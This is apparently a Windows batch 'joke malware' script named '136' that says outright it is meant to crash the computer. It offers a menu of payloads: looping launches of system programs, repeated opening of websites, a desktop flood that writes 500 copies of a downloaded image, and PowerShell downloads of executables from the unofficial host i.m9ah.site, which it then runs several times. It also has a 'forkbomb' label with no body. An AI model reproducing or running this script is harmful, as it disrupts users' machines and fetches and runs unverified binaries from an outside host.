@echo off
echo Loading 136
if exist "C:\system32\notepad.exe" (
    echo Detected Normal Windows
    timeout /t 2 /nobreak >nul
    goto intro
) else (
    echo Detected Windows Sandbox
    timeout /t 2 /nobreak >nul
    goto intro
)    
:intro
title 136
echo This program opens a lot of programs and is intended to crash your computer.
echo It also downloads programs onto your computer.
echo.
echo Use at your own risk. I am not responsible for any damage caused by this script.
echo.
echo Are you sure you want to continue? (Y/N)
set /p choice=Select: 
if /I "%choice%"=="Y" goto menu
if /I "%choice%"=="N" exit
if /I "%choice%"=="S" goto sandbox
echo Invalid choice. Please try again.
goto intro
goto menu
:Invalid
cls
echo Invalid choice. Please try again.
goto skipclr
:menu
cls
:skipclr
echo   _ _____  __         _           _   
echo  / l___ / / /_       l l__   __ _l l_ 
echo  l l l_ \l '_ \      l '_ \ / _` l __l
echo  l l___) l (_) l  _  l l_) l (_l l l_ 
echo  l_l____/ \___/  (_) l_.__/ \__,_l\__l
echo.
echo I am not responsible for any damage caused by this script.
echo Use at your own risk.
echo.
echo Enter 1 to start (this will immediately start)
echo Enter 2 to go to individual payloads
echo Enter 3 to exit
set /p choice=Select:  

if "%choice%"=="1" goto part1
if "%choice%"=="2" goto part2
if "%choice%"=="3" goto part3

echo Invalid choice. Please try again.
goto Invalid
:part2
cls
echo Payload list
echo.
echo 1. Programs - No Downloading
echo 2. Websites - No Downloading
echo 3. Downloading Apps
echo 4. Open downloaded apps - Execute 3 first
echo 5. Desktop Flood - Doesnt Need 3
echo 6. Forkbomb - Dangerous
echo 7. Back to main menu
set /p vchoice=Select: 

if "%vchoice%"=="1" goto defaultos
if "%vchoice%"=="2" goto ex2
if "%vchoice%"=="3" goto download
if "%vchoice%"=="4" goto openapps
if "%vchoice%"=="5" goto desktopflood  
if "%vchoice%"=="6" goto forkbomb
if "%vchoice%"=="7" exit
goto menu

:part3
exit

:sandbox
echo Sandbox mode activated. 
echo Missing files from Windows Sandbox will be downloaded.
timeout /t 3 /nobreak >nul
powershell -Command "Invoke-WebRequest http://i.m9ah.site/img/mspaint.exe -OutFile mspaint.exe"
powershell -Command "Invoke-WebRequest http://i.m9ah.site/img/notepad.exe -OutFile notepad.exe"
powershell -Command "Invoke-WebRequest http://i.m9ah.site/img/charmap.exe -OutFile charmap.exe"
    start "" "C:\Windows\System32\cmd.exe"
    start "" "notepad.exe"  
    start "" "mspaint.exe"
    start "" "C:\Windows\System32\calc.exe"
    start "" "C:\Windows\System32\explorer.exe"
    start "" "C:\Windows\System32\magnify.exe"
    start "" "C:\Windows\System32\osk.exe"
    start "" "charmap.exe"
goto ex2

:part1
echo You have 10 seconds to cancel (CTRL+C) before the payloads start.
timeout /t 10 /nobreak >nul
goto defaultos
:defaultos
for /l %%i in (1,1,2) do (
    start "" "C:\Windows\System32\cmd.exe"
    start "" "C:\Windows\System32\notepad.exe"  
    start "" "C:\Windows\System32\mspaint.exe"
    start "" "C:\Windows\System32\calc.exe"
    start "" "C:\Windows\System32\explorer.exe"
    start "" "C:\Windows\System32\magnify.exe"
    start "" "C:\Windows\System32\osk.exe"
    start "" "C:\Windows\System32\charmap.exe"
)
goto ex2
:ex2
for /l %%i in (1,1,2) do (
    start "" "https://duckduckgo.com/?t=ffab&q=33.5x2&ia=calculator"
    timeout /t 5 /nobreak >nul
    start "" "https://www.tiktok.com/@blizziboi/video/7087238410930326826"
    timeout /t 5 /nobreak >nul
    start "" "https://www.tiktok.com/@blizziboi/video/7533430787178302733"
    timeout /t 5 /nobreak >nul
    start "" "https://www.tiktok.com/"
    timeout /t 5 /nobreak >nul
    start "" "https://www.youtube.com/watch?v=kvwKxIxRUog"
    timeout /t 5 /nobreak >nul
    start "" "https://88x31.nl/"
    timeout /t 5 /nobreak >nul
    start "" "https://duckduckgo.com/?t=ffab&q=why+is+my+computer+so+slow&ia=web"
    timeout /t 5 /nobreak >nul
    start "" "https://raw.githubusercontent.com/aaesth/aaesth.github.io/refs/heads/main/v1.png"
)
goto desktopflood
:desktopflood
cd C:\Users\%username%\Desktop
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/aaesth/aaesth.github.io/refs/heads/main/v1.png -OutFile v1.png"
for /l %%i in (1,1,500) do (
    copy /Y v1.png v1_%%i.png >nul
)
goto download

:download
powershell -Command "Invoke-WebRequest 'https://release-assets.githubusercontent.com/github-production-release-asset/466446150/d9c834c2-819e-4343-9cd4-1ea61004285c?sp=r&sv=2018-11-09&sr=b&spr=https&se=2025-09-08T15%3A18%3A14Z&rscd=attachment%3B+filename%3D7z2501-x64.exe&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2025-09-08T14%3A17%3A16Z&ske=2025-09-08T15%3A18%3A14Z&sks=b&skv=2018-11-09&sig=1UovQb%2F8kve%2BGalUx2FSJnlPiotIAkSb336uO7od030%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc1NzM0MTU1NSwibmJmIjoxNzU3MzQxMjU1LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.ILB037saeshs-Y5RvaPO1y05Eb68nakrjoCEvsGu2Ik&response-content-disposition=attachment%3B%20filename%3D7z2501-x64.exe&response-content-type=application%2Foctet-stream' -OutFile 7z.exe"
powershell -Command "Invoke-WebRequest 'http://i.m9ah.site/img/Firefox%20Installer.exe' -OutFile Firefox.exe"
goto openapps

:openapps
start "" "7z.exe"
start "" "Firefox.exe"
start "" "7z.exe"
start "" "Firefox.exe"
start "" "7z.exe"
start "" "Firefox.exe"
start "" "7z.exe"
start "" "Firefox.exe"
goto forkbomb

:forkbomb
